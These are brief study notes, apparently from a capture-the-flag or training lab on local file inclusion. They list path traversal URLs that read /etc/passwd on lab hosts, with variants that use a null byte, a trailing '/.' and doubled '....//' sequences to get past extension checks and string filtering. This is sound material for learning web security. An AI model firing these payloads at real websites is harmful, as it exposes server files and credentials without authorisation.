File Inclusion

## Path Traversal

- http://webapp.thm/index.php?lang=../../../../etc/passwd


use %00 to remove .php extension from error mesage: 
- http://webapp.thm/index.php?lang=/etc/passwd%00

use /. to get current directory:
http://10.10.17.204/lab4.php?file=../../../etc/passwd/.

bypass string sanitations:

http://10.10.17.204/lab5.php?file=....//....//....//....//etc/passwd